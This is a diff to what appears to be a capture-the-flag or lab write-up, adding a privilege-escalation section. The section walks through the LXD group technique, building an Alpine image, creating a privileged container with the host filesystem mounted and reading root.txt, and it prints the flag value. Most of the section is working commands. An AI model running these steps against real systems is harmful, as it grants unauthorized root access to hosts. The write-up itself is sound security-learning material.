@@ -50,4 +50,48 @@ default creds
   ================================
   Privilege escalation
   
+  Path : Privilege escalation via LXD : https://github.com/initstring/lxd_root
+  We will try the version two exploit first.
+  The syntax is as python3 lxd_rootv2.py <container name> meaning we need to create a container or get a list of existing containers.
+  Listing the container names is challenging so we decide to try out the method at https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
   
+  #### Steps
+  
+  #Install requirements
+sudo apt update
+sudo apt-get install -y golang-go debootstrap rsync gpg squashfs-tools
+#Clone repo
+sudo go get -d -v github.com/lxc/distrobuilder
+#Make distrobuilder
+cd $HOME/go/src/github.com/lxc/distrobuilder
+make
+#Prepare the creation of alpine
+mkdir -p $HOME/ContainerImages/alpine/
+cd $HOME/ContainerImages/alpine/
+wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
+#Create the container
+sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml
+
+# If that fails, run it adding -o image.release=3.8 at the end.
+
+Then, upload to the vulnerable server the files lxd.tar.xz and rootfs.squashfs
+Add the image:
+
+lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+lxc image list #You can see your new imported image
+
+Create a container and add root path
+lxc init
+lxc init alpine privesc -c security.privileged=true
+lxc list #List containers
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+
+Execute the container:
+
+lxc start privesc
+lxc exec privesc /bin/sh
+[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
+
+Root user pawned!!
+/mnt/root/root # cat root.txt
+5b5ec4b76d0f055f5d4ea6eeea869a3d
